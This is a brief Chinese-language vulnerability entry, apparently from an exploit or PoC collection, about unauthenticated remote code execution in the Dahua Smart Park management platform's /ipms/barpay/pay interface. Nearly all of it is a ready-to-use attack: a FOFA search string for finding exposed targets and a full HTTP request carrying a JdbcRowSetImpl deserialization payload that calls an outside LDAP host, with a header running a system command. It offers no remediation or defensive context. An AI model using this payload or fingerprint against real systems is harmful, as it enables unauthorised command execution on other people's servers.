## 大华智慧园区综合管理平台ipms接口存在远程代码执行漏洞

大华智慧园区综合管理平台/ipms/barpay/pay存在远程代码执行漏洞，允许未经授权的攻击者执行系统命令。

## fofa
```
body="src=/WPMS/asset/common/js/jsencrypt.min.js"
```

## poc
```
POST /ipms/barpay/pay HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cmd: whoami
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 104

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://gobygo.net/A4", "autoCommit": true}
```
